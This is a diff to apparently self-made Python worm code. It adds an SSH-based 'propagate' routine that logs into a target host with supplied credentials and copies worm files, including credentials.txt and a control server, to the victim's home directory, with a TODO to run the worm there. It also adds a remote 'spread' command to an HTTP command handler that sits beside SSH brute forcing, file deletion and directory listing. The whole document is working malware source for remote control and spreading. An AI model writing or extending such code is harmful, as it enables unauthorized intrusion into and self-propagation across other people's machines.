@@ -17,16 +17,21 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 PROPAGATION
 """
 def propagate(host,port,username,password):
-	ssh = paramiko.SSHClient()
-	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	#TODO run worm in the infected machine
+
+	files = ["config.json","credentials.txt","README.md","worm.py","control_server.py","owned.txt","requirements.txt"]
 	try:
-		ssh.connect(host,port,username,password,banner_timeout=2)
+		ssh = paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		ssh.connect(host,port,username,password)
 		scp = sc.SCPClient(ssh.get_transport())
-		scp.put("owned.txt","~/")
+		scp.put(files,"~/")
 		scp.close()
 		ssh.close()
+		return "spreaded in " + host
 	except:
 		ssh.close()
+		return "not possible to spread, are credentials right?"
 		
 
 """
@@ -198,7 +203,7 @@ def tree_home():
 	process = subprocess.run(["tree","/home"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
 	return process.stdout
 	
-def execute_command(command,ls_path=None,ssh_bf_target=None):
+def execute_command(command,ls_path=None,ssh_bf_target=None,s_target=None,s_username=None,s_password=None):
 	if command == "ls":
 		return ls(ls_path)
 	elif command == "delete":
@@ -208,7 +213,7 @@ def execute_command(command,ls_path=None,ssh_bf_target=None):
 		return str(ssh_brute_force(ssh_bf_target,22))
 	
 	elif command == "spread":
-		return "propagate"
+		return propagate(s_target,22,s_username,s_password)
 		
 	elif command == "tree_home":
 		return tree_home()
@@ -236,6 +241,11 @@ class request_handler(BaseHTTPRequestHandler):
 			elif len(command_args) == 2 and command == "ssh_brute_force":
 				target = command_args[1]
 				output = execute_command(command,ssh_bf_target=target)
+			elif len(command_args) == 4 and command == "spread":
+				target = command_args[1]
+				username = command_args[2]
+				password = command_args[3]
+				output = execute_command(command,s_target=target,s_username=username,s_password=password)
 			else:
 				output = execute_command(command)
 			"""
